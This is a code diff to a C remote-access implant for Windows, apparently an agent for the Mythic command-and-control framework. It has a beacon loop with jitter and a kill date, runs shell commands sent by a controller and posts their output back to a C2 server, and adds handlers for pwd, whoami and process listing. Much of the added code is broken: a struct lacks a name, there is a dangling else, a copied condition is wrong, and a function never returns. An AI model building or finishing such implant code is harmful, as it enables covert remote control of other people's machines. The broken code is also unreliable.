@@ -34,12 +34,7 @@ typedef struct {
     char killdate[32];  //
 } implant_config;
 
-//typedef struct {
-//char cmd[20];
-//char params[30];
-//double ts;
-//char uuid[37];
-//} task;
+
 
 char json_buff[250];
 
@@ -51,7 +46,8 @@ char json_buff[250];
 //    .jitter = REPLACE_ME_JITTER,      //
 //    .get_uri = "REPLACE_ME_GET_URI",  
 //    .post_uri = "REPLACE_ME_POST_URI",
-//    .query_path_name = "REPLACE_ME_QUERY_PATH_NAME",
+//    .query_path_name = "REPLACE_ME_QUERY_PATH_NAME",  // oryginal_config - use when compiling via
+                                                        // mythic, not makefile
 //    .eec = REPLACE_ME_EEC,        
 //    .proxy_host = "REPLACE_ME_PROXY_HOST", //
 //    .proxy_port = "REPLACE_ME_PROXY_PORT", //
@@ -106,9 +102,6 @@ char* send_c2_post_request(char* json_data) {
         }
     }
 return "";
-   // InternetCloseHandle(hConnect);
-   // InternetCloseHandle(hInternet);
-   // InternetCloseHandle(hRequest);
 }
 void checkin(){
         char json_checkin_buff[190];
@@ -154,31 +147,6 @@ bool sleep_with_jitter(int interval, int jitter){
 return 0;
 }
 
-void dispatcher(cJSON *task){
-    if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"shell")){
-        char* command_output = handle_shell_cmd(task);
-        cJSON *root = cJSON_CreateObject();
-        cJSON_AddStringToObject(root,"action","post_response");
-        cJSON *arr = cJSON_CreateArray();
-        cJSON_AddItemToObject(root,"responses",arr);
-        
-            cJSON *obj1 = cJSON_CreateObject();
-            cJSON_AddStringToObject(obj1,"task_id",cJSON_GetObjectItemCaseSensitive(task,"id")->valuestring);
-            cJSON_AddStringToObject(obj1,"user_output",command_output);
-            cJSON_AddItemToArray(arr,obj1);
-
-        char* command_executed = cJSON_Print(root);
-        send_c2_post_request(command_executed);
-        free(command_executed);
-        free(command_output);
-        free(root);
-    }
-    else{
-        printf(":( unknown command:\n");
-            puts(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring);
-    }
-
-}
 
 char* handle_shell_cmd(cJSON *task){
      FILE *fp;
@@ -194,13 +162,122 @@ strncpy(ret_val,output,read+1);
 return ret_val;
 }
 
+char* handle_pwd_cmd(cJSON *task){
+     char output[260];
+     size_t read = 0;
+     read = GetCurrentDirectoryA(260,output);
+     if(read){
+        char* ret_val = (char*)malloc(read+1);
+        strncpy(ret_val,output,read+1);
+        return ret_val;
+     }
+     char* ret_val = (char*)malloc(19);
+        strncpy(ret_val,"failed to read cwd\0",19);
+        return ret_val;
+
+}
+
+char* handle_whoami_cmd(cJSON *task){
+     char output[21];
+     size_t read = 21;
+     GetUserNameA(output,read);
+     if(read){
+        char* ret_val = (char*)malloc(read);
+        strncpy(ret_val,output,read);
+        return ret_val;
+     }
+     char* ret_val = (char*)malloc(22);
+        strncpy(ret_val,"failed to read whoami\0",22);
+        return ret_val;
+
+}
+
+typedef struct ProcessInfo{
+    char szExeFile[260];
+    int th32ParentProcessID;
+    int th32ProcessID;
+}
+
+void dispatcher(cJSON *task){
+    if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"shell")){
+        char* command_output = handle_shell_cmd(task);
+    }
+    if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"pwd")){
+         char* command_output = handle_pwd_cmd(task);
+
+    }
+    if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"shell")){
+        char* command_output = handle_whoami_cmd(task);
+    }
+    if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"ps")){
+
+
+    }
+
+        cJSON *root = cJSON_CreateObject();
+        cJSON_AddStringToObject(root,"action","post_response");
+        cJSON *arr = cJSON_CreateArray();
+        cJSON_AddItemToObject(root,"responses",arr);
+        
+            cJSON *obj1 = cJSON_CreateObject();
+            cJSON_AddStringToObject(obj1,"task_id",cJSON_GetObjectItemCaseSensitive(task,"id")->valuestring);
+            cJSON_AddStringToObject(obj1,"user_output",command_output);
+            cJSON_AddItemToArray(arr,obj1);
+
+        char* command_executed = cJSON_PrintUnformatted(root);
+        send_c2_post_request(command_executed);
+        free(command_executed);
+        free(command_output);
+        free(root);
+    
+
+    
+    else{
+        printf(":( unknown command:\n");
+            puts(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring);
+    }
+
+}
+
+char* handle_ps_cmd(cJSON *task){
+     HANDLE han = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
+     if(han == INVALID_HANDLE_VALUE) {
+        char* ret_val = (char*)malloc(17);
+        strncpy(ret_val,"failed to get ps\0",17);
+        return(ret_val);
+    }
+
+     PROCESSENTRY32 proces;
+     proces->dwSize = sizeof(PROCESSENTRY32);
+
+        cJSON *root = cJSON_CreateObject();
+        cJSON_AddStringToObject(root,"action","post_response");
+        cJSON *arr = cJSON_CreateArray();
+        cJSON_AddItemToObject(root,"responses",arr);
+     cJSON *item = cJSON_CreateObject();
+        
+
+     if(Process32First(han,&proces)){
+        cJSON_AddNumberToObject(item,"ProcessID",proces.th32ProcessID);   
+        cJSON_AddNumberToObject(item,"th32ParentProcessID",proces.th32ParentProcessID);
+        cJSON_AddStringToObject(item,"szExeFile",proces.szExeFile);
+
+
+        //th32ProcessID th32ParentProcessID szExeFile[260]
+     }
+
+
+
+}
+
 int main(){
 	checkin();
 //main loop
 abc:
+
         get_tasks();
-        
         sleep_with_jitter(config.interval,config.jitter);
+
 goto abc;
 
 	return 0;
